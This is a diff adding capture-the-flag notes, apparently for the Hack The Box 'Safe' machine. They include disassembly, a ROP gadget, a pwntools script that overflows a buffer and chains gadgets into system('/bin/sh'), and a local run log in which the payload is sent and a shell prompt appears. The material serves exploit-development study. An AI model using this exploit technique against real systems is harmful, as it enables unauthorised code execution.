@@ -103,7 +103,75 @@ r2 ./myapp
 │           0x00401153      4889e5         mov rbp, rsp
 │           0x00401156      4889e7         mov rdi, rsp
 └           0x00401159      41ffe5         jmp r13
+objdump -d myapp
+0000000000401040 <system@plt>:
+  401040:	ff 25 da 2f 00 00    	jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
+  401046:	68 01 00 00 00       	pushq  $0x1
+  40104b:	e9 d0 ff ff ff       	jmpq   401020 <.plt>
+ropper -f myapp
+0x0000000000401206: pop r13; pop r14; pop r15; ret; 
 
+==================exploit.py=====================
+cat exploit.py 
+from pwn import *
+
+#p = remote("safe.htb", 1337)
+p = process("./myapp")
+
+context(os="linux", arch="amd64")
+context.log_level = "DEBUG"
+
+JUNK = ("A" * 122).encode()
+JUNK += "/bin/sh\x00".encode() # RBP
+
+"""
+ROP chain to populate r13 with system()'s address:
+0x0000000000401206: pop r13; pop r14; pop r15; ret; 
+
+sym.test() -> Need to JMP to address of system at the end
+  (fcn) sym.test 10
+    sym.test ();
+           0x00401152      55             push rbp
+           0x00401153      4889e5         mov rbp, rsp
+           0x00401156      4889e7         mov rdi, rsp
+           0x00401159      41ffe5         jmp r13
+"""
+
+payload = JUNK + p64(0x0000000000401206) # ROP chain gadget
+payload += p64(0x401040) # pop r13
+payload += ("BBBBBBBB").encode() # pop r14
+payload += ("CCCCCCCC").encode() # pop r15
+payload += p64(0x00401152) # sym.test
+
+p.recvline()
+p.sendline(payload)
+p.interactive()
+====================end of scripts================
+====================local test====================
+python3 exploit.py 
+[+] Starting local process './myapp': pid 6781
+[DEBUG] Received 0x3f bytes:
+    b' 06:30:59 up 39 min,  1 user,  load average: 0.34, 0.50, 0.42\n'
+    b'\n'
+[DEBUG] Sent 0xab bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000070  41 41 41 41  41 41 41 41  41 41 2f 62  69 6e 2f 73  │AAAA│AAAA│AA/b│in/s│
+    00000080  68 00 06 12  40 00 00 00  00 00 40 10  40 00 00 00  │h···│@···│··@·│@···│
+    00000090  00 00 42 42  42 42 42 42  42 42 43 43  43 43 43 43  │··BB│BBBB│BBCC│CCCC│
+    000000a0  43 43 52 11  40 00 00 00  00 00 0a                  │CCR·│@···│···│
+    000000ab
+[*] Switching to interactive mode
+
+[DEBUG] Received 0xa4 bytes:
+    b'What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh\n'
+What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
+[*] Got EOF while reading in interactive
+$ whoami
+========================end local test=======================
+========================server test==========================
+
+https://0xdf.gitlab.io/2019/10/26/htb-safe.html#shell-as-user
 
 References:
 1. https://bufferoverflows.net/getting-started-with-linux-buffer-overflow/
